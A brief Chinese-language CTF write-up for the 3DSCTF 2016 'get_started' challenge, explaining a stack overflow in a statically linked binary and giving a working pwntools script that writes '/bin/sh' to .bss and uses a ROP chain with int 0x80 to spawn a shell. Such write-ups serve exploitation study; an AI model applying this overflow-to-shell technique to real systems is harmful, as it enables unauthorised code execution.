---
title: "get_started_3dsctf_2016"
description: ""
date: 2023-04-07T00:15:13+08:00
lastmod: 2023-04-07T00:15:13+08:00
draft: false
images: []
type: docs
weight: 992
toc: true
---

## 0x01 分析

![15690f8041744dcc4dc1626db67656d9](images/15690f8041744dcc4dc1626db67656d9.png)  

简单的溢出，但是这是一个静态链接，程序里没有system函数和 `/bin/sh` 字符串，但是存在内陷指令，也存在mprotect函数。所以这里可以用ret2syscall来做，或者用mprotect修改bss段权限注入shellcode，或者rop-chain来做

## 0x02 Exploit

```python
from pwn import*
o = process("./pwn")
elf = ELF("./pwn")
gets_addr = elf.sym['gets']
main = elf.sym['main']
bss_addr = 0x80EBF80
int_80 = 0x0806d7e5
pop_eax = 0x080b91e6
pop3 = 0x0806fc30
payload = b'a'*(4*14) + p32(gets_addr) + p32(main) + p32(bss_addr)
o.sendline(payload)
o.sendline("/bin/sh")
payload = b'a'*(4*14) + p32(pop3) + p32(0) + p32(0) + p32(bss_addr) + p32(pop_eax) + p32(11) + p32(int_80)
o.sendline(payload)
o.interactive()
```

![6155ac6a7eac7f47876559779f4317eb](images/6155ac6a7eac7f47876559779f4317eb.png)  

自行尝试其他方法
